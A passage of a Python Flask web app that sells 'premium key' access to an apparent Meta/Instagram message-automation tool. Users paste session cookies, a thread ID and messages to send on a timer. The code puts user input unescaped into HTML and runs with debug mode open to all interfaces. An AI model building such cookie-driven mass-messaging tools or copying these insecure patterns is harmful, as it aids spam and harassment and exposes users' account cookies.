                <input type="text" name="new_username" class="form-input" placeholder="Choose a unique username" required>
            </div>
            <div class="form-group">
                <label class="form-label">Choose Password</label>
                <input type="password" name="new_password" class="form-input" placeholder="Create a strong password" required>
            </div>
            <div class="form-group">
                <label class="form-label">Confirm Password</label>
                <input type="password" name="confirm_password" class="form-input" placeholder="Re-enter your password" required>
            </div>
            <button type="submit" name="signup" class="btn">Create Account</button>
        </form>
    </div>
    '''
    
    return render_template_string(HTML_TEMPLATE, content=content)

def approval_request_page():
    user_key = session.get('user_key')
    username = session.get('username')
    
    if request.method == 'POST':
        if 'request_approval' in request.form:
            pending = load_pending_approvals()
            pending[user_key] = {
                "name": username,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            save_pending_approvals(pending)
            session['approval_status'] = 'pending'
            return redirect(url_for('index'))
        
        elif 'admin_panel' in request.form:
            session['approval_status'] = 'admin_login'
            return redirect(url_for('index'))
        
        elif 'check_approval' in request.form:
            if check_approval(user_key):
                session['key_approved'] = True
                session['approval_status'] = 'approved'
                return redirect(url_for('index'))
        
        elif 'back' in request.form:
            session['approval_status'] = 'not_requested'
            return redirect(url_for('index'))
        
        elif 'admin_login' in request.form:
            admin_password = request.form.get('admin_password')
            if admin_password == ADMIN_PASSWORD:
                session['approval_status'] = 'admin_panel'
                return redirect(url_for('index'))
        
        elif 'admin_back' in request.form:
            session['approval_status'] = 'not_requested'
            return redirect(url_for('index'))
    
    status = session.get('approval_status', 'not_requested')
    content = ''  # ✅ YEH LINE ADD KARO - pehle hi initialize karo
    
    if status == 'not_requested':
        content = f'''
        <div class="main-header">
            <img src="https://ibb.co/pBvhZnFL.jpg" class="Rishi-logo">
            <h1>PREMIUM KEY APPROVAL REQUIRED</h1>
            <p>ONE MONTH 500 RS PAID</p>
        </div>
        
        <div class="info-card">
            <h3>REQUEST Access</h3>
            <p><strong>Your Unique Key:</strong> <code>{user_key}</code></p>
            <p><strong>Username:</strong> {username}</p>
        </div>
        
        <div class="grid">
            <form method="POST">
                <button type="submit" name="request_approval" class="btn">REQUEST Approval</button>
            </form>
            <form method="POST">
                <button type="submit" name="admin_panel" class="btn">ADMIN Panel</button>
            </form>
        </div>
        '''
    
    elif status == 'pending':
        whatsapp_url = send_whatsapp_message(username, user_key)
        
        content = f'''
        <div class="main-header">
            <img src="https://ibb.co/pBvhZnFL.jpg" class="Rishi-logo">
            <h1>APPROVAL PENDING</h1>
            <p>Please contact admin on WhatsApp</p>
        </div>
        
        <div class="alert alert-warning">
            APPROVAL Pending...
        </div>
        
        <div class="info-card">
            <p><strong>Your Key:</strong> <code>{user_key}</code></p>
        </div>
        
        <div style="text-align: center; margin: 20px 0;">
            <a href="{whatsapp_url}" target="_blank" class="whatsapp-btn">
                CLICK HERE TO OPEN WHATSAPP
            </a>
        </div>
        
        <div class="info-card">
            <h3>MESSAGE Preview:</h3>
            <div class="console-output">
                HELLO RISHI SIR PLEASE APPROVAL<br>
                My name is {username}<br>
                Please approve my key:<br>
                KEY {user_key}
            </div>
        </div>
        
        <div class="grid">
            <form method="POST">
                <button type="submit" name="check_approval" class="btn">CHECK Approval Status</button>
            </form>
            <form method="POST">
                <button type="submit" name="back" class="btn">BACK</button>
            </form>
        </div>
        '''
    
    elif status == 'admin_login':
        content = '''
        <div class="main-header">
            <img src="https://ibb.co/pBvhZnFL.jpg" class="Rishi-logo">
            <h1>ADMIN LOGIN</h1>
        </div>
        
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Enter Admin Password:</label>
                <input type="password" name="admin_password" class="form-input" required>
            </div>
            <div class="grid">
                <button type="submit" name="admin_login" class="btn">LOGIN</button>
                <button type="submit" name="admin_back" class="btn">BACK</button>
            </div>
        </form>
        '''
    
    elif status == 'admin_panel':
        return admin_panel()
    
    else:
        # ✅ Agar koi aur status ho to default page show karo
        content = f'''
        <div class="alert alert-error">
            <h3>ERROR: Unknown Status</h3>
            <p>Status: {status}</p>
            <p>Please go back to login</p>
        </div>
        <form method="POST">
            <button type="submit" name="back" class="btn">GO BACK</button>
        </form>
        '''
    
    return render_template_string(HTML_TEMPLATE, content=content)

def main_app():
    user_id = session.get('user_id')
    username = session.get('username')
    
    if not user_id:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        if 'save_config' in request.form:
            chat_id = request.form.get('chat_id', '')
            name_prefix = request.form.get('name_prefix', '')
            delay = int(request.form.get('delay', 5))
            cookies = request.form.get('cookies', '')
            messages = request.form.get('messages', '')
            
            db.update_user_config(user_id, chat_id, name_prefix, delay, cookies, messages)
            return redirect(url_for('index'))
        
        elif 'start_automation' in request.form:
            user_config = db.get_user_config(user_id)
            start_automation(user_config, user_id)
            return redirect(url_for('index'))
        
        elif 'stop_automation' in request.form:
            stop_automation(user_id)
            return redirect(url_for('index'))
        
        elif 'logout' in request.form:
            session.clear()
            return redirect(url_for('index'))
    
    user_config = db.get_user_config(user_id)
    automation_state = db.get_automation_state(user_id)
    session_automation = session.get('automation_state', {
        'running': False,
        'message_count': 0,
        'logs': [],
        'message_rotation_index': 0
    })
    
    console_logs = ''
    if session_automation.get('logs'):
        for log in session_automation['logs'][-20:]:
            console_logs += f'<div class="console-line">{log}</div>\n'
    else:
        console_logs = '<div class="console-line">No logs yet. Start automation to see activity...</div>'
    
    status_text = "🟢 RUNNING" if automation_state['is_running'] else "🔴 STOPPED"
    status_color = "#4caf50" if automation_state['is_running'] else "#f44336"
    start_disabled = "disabled" if automation_state['is_running'] else ""
    stop_disabled = "disabled" if not automation_state['is_running'] else ""
    
    content = f'''
    <div class="main-header">
        <img src="https://ibb.co/Psg1Q121.jpg" class="Rishi-logo">
        <h1>THE RISHI OFFLINE E2EE</h1>
        <p>Welcome back, {username}!</p>
    </div>
    
    <div class="tabs">
        <div class="tab active" onclick="showTab('dashboard-tab')">📊 Dashboard</div>
        <div class="tab" onclick="showTab('settings-tab')">⚙️ Settings</div>
        <div class="tab" onclick="showTab('logs-tab')">📝 Logs</div>
    </div>
    
    <div id="dashboard-tab" class="tab-content main-content">
        <h2 style="color: #4ecdc4; margin-bottom: 20px;">Automation Status</h2>
        
        <div class="grid">
            <div class="info-card">
                <div class="metric-label">Status</div>
                <div class="metric-value" style="color: {status_color};">{status_text}</div>
            </div>
            <div class="info-card">
                <div class="metric-label">Messages Sent</div>
                <div class="metric-value">{automation_state['messages_sent']}</div>
            </div>
            <div class="info-card">
                <div class="metric-label">Last Started</div>
                <div class="metric-value" style="font-size: 1.2rem;">{automation_state.get('last_started', 'Never') or 'Never'}</div>
            </div>
        </div>
        
        <div class="grid" style="margin-top: 30px;">
            <form method="POST">
                <button type="submit" name="start_automation" class="btn" {start_disabled}>
                    ▶️ Start Automation
                </button>
            </form>
            <form method="POST">
                <button type="submit" name="stop_automation" class="btn" {stop_disabled}>
                    ⏹️ Stop Automation
                </button>
            </form>
        </div>
    </div>
    
    <div id="settings-tab" class="tab-content main-content" style="display: none;">
        <h2 style="color: #4ecdc4; margin-bottom: 20px;">Configuration Settings</h2>
        
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Chat ID / Thread ID</label>
                <input type="text" name="chat_id" class="form-input" 
                    value="{user_config.get('chat_id', '')}" 
                    placeholder="Enter Meta/Instagram thread ID">
            </div>
            
            <div class="form-group">
                <label class="form-label">Name Prefix</label>
                <input type="text" name="name_prefix" class="form-input" 
                    value="{user_config.get('name_prefix', '')}" 
                    placeholder="e.g., Hi, Hello">
            </div>
            
            <div class="form-group">
                <label class="form-label">Delay (seconds)</label>
                <input type="number" name="delay" class="form-number" 
                    value="{user_config.get('delay', 5)}" 
                    min="1" max="3600">
            </div>
            
            <div class="form-group">
                <label class="form-label">Cookies</label>
                <textarea name="cookies" class="form-textarea" rows="4" 
                    placeholder="Paste your Meta/Instagram cookies here">{user_config.get('cookies', '')}</textarea>
            </div>
            
            <div class="form-group">
                <label class="form-label">Messages (one per line or comma-separated)</label>
                <textarea name="messages" class="form-textarea" rows="6" 
                    placeholder="Enter messages to send">{user_config.get('messages', '')}</textarea>
            </div>
            
            <button type="submit" name="save_config" class="btn">💾 Save Configuration</button>
        </form>
    </div>
    
    <div id="logs-tab" class="tab-content main-content" style="display: none;">
        <div class="console-section">
            <h3 class="console-header">📡 AUTOMATION CONSOLE</h3>
            <div class="console-output">
                {console_logs}
            </div>
        </div>
    </div>
    
    <div style="margin-top: 30px; text-align: center;">
        <form method="POST">
            <button type="submit" name="logout" class="btn" style="background: linear-gradient(45deg, #f44336, #e91e63);">
                🚪 Logout
            </button>
        </form>
    </div>
    '''
    
    return render_template_string(HTML_TEMPLATE, content=content)

def admin_panel():
    if request.method == 'POST':
        if 'approve_key' in request.form:
            key_to_approve = request.form.get('approve_key')
            name_to_approve = request.form.get('approve_name')
            
            approved = load_approved_keys()
            approved[key_to_approve] = {
                "name": name_to_approve,
                "approved_at": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            save_approved_keys(approved)
            
            pending = load_pending_approvals()
            if key_to_approve in pending:
                del pending[key_to_approve]
                save_pending_approvals(pending)
            
            return redirect(url_for('index'))
        
        elif 'logout_admin' in request.form:
            session['approval_status'] = 'not_requested'
            return redirect(url_for('index'))
    
    pending = load_pending_approvals()
    
    pending_rows = ''
    if pending:
        for key, data in pending.items():
            pending_rows += f'''
            <tr>
                <td style="color: white; padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1);">
                    {data.get('name', 'Unknown')}
                </td>
                <td style="color: white; padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1);">
                    <code style="background: rgba(78, 205, 196, 0.2); padding: 4px 8px; border-radius: 4px;">{key}</code>
                </td>
                <td style="color: white; padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1);">
                    {data.get('timestamp', 'N/A')}
                </td>
                <td style="padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1);">
                    <form method="POST" style="margin: 0;">
                        <input type="hidden" name="approve_key" value="{key}">
                        <input type="hidden" name="approve_name" value="{data.get('name', 'Unknown')}">
                        <button type="submit" class="btn" style="padding: 8px 16px; font-size: 14px;">
                            ✅ APPROVE
                        </button>
                    </form>
                </td>
            </tr>
            '''
    else:
        pending_rows = '''
        <tr>
            <td colspan="4" style="color: rgba(255,255,255,0.6); padding: 20px; text-align: center;">
                No pending approvals
            </td>
        </tr>
        '''
    
    content = f'''
    <div class="main-header">
        <img src="https://ibb.co/pBvhZnFL.jpg" class="Rishi-logo">
        <h1>ADMIN PANEL</h1>
        <p>Manage User Approvals</p>
    </div>
    
    <div class="main-content">
        <h2 style="color: #4ecdc4; margin-bottom: 20px; text-shadow: 0 0 10px rgba(78, 205, 196, 0.5);">
            📋 Pending Approvals
        </h2>
        
        <div style="overflow-x: auto;">
            <table style="width: 100%; border-collapse: collapse; background: rgba(255, 255, 255, 0.05); border-radius: 10px; overflow: hidden;">
                <thead>
                    <tr style="background: rgba(78, 205, 196, 0.2);">
                        <th style="color: white; padding: 12px; text-align: left; font-weight: 600;">Username</th>
                        <th style="color: white; padding: 12px; text-align: left; font-weight: 600;">User Key</th>
                        <th style="color: white; padding: 12px; text-align: left; font-weight: 600;">Request Time</th>
                        <th style="color: white; padding: 12px; text-align: left; font-weight: 600;">Action</th>
                    </tr>
                </thead>
                <tbody>
                    {pending_rows}
                </tbody>
            </table>
        </div>
        
        <div style="margin-top: 30px;">
            <form method="POST">
                <button type="submit" name="logout_admin" class="btn">
                    ← Back to Main
                </button>
            </form>
        </div>
    </div>
    '''
    
    return render_template_string(HTML_TEMPLATE, content=content)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
